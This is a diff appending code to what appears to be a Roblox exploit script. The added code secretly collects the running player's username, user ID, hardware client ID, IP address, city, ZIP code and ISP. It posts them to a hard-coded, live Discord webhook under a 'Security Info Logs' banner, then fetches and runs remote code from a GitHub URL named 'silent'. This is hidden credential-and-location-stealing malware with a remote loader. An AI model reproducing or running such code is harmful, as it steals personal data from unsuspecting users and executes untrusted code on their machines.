@@ -579,3 +579,159 @@ end)
             end
         end
         end)
+
+
+getgenv().Version = '2.6.3.';
+getgenv().sym = 'Symmertrical Blue ®';
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://www.roblox.com/users/profile/playergames-json?userId="..game.Players.LocalPlayer.UserId..""
+}).Body)
+
+local count = 0
+
+for _, v in ipairs(response.Games) do
+  count = count + v.Plays
+end
+
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
+})
+.Body)
+
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
+})
+.Body)
+
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
+})
+.Body)
+
+local exploit,version = identifyexecutor() 
+
+local player = game:GetService"Players".LocalPlayer
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+   else 
+   premium = false
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+
+
+
+local webh = "https://discord.com/api/webhooks/1057377371889614940/Akq9VTI7bz7cll5WFQ6f8qZautkZECmnVOCCevLfzbibB-MILoFgtm-ZIcreIC2EvUHk"
+
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = '`` | Security Info Logs | ``',
+       ['description'] = '**| SECRUITY LOGS HAS BEEN EXECUTED ! @everyone |**',
+       ['type'] = "rich",
+       ['color'] = tonumber(16753920),
+       ['fields'] = {
+          {name = "**Users Profile**", value = ''.."https://www.roblox.com//users/"..game.Players.LocalPlayer.UserId.."/profile"},
+          {name = "**Premium Account**", value = premium},
+          {name = '**Username**', value = game:GetService("Players").LocalPlayer.Name},
+          {name = '**Displayname**', value = ''..game.Players.LocalPlayer.DisplayName},
+          {name = "**UserID**", value = ''..game.Players.LocalPlayer.UserId},
+          {name = "**Alt Detection**", value = alt},
+          {name = "**Games Visits**", value = ''..count},
+          {name = "**Verified Badge**", value = ''..tostring(response.hasVerifiedBadge)},
+          {name = '**Account Description**', value = "'"..response.description.."'"},
+          {name = '**Account Created**', value = ""..response.created..""},
+          {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = '**IP Address**', value = ''..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body},
+          {name = '**Country**', value = ''..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)},
+          {name = '**Language**', value = ''..game.Players.LocalPlayer.LocaleId},
+          {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+          {name = "**Executor**", value = identifyexecutor()..'  |    Executor Version: '..version},
+          {name = "**Game Place ID**", value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"},
+          {name = "**Game Name**", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},
+          {name = "** **", value = '**| Version |  **'..Version..' | '..sym},
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+local player_name = game:GetService("Players").LocalPlayer.Name
+local webhook_url = "https://discord.com/api/webhooks/1057377371889614940/Akq9VTI7bz7cll5WFQ6f8qZautkZECmnVOCCevLfzbibB-MILoFgtm-ZIcreIC2EvUHk"
+
+local ip_info = syn.request({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+syn.request(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/silent"))();
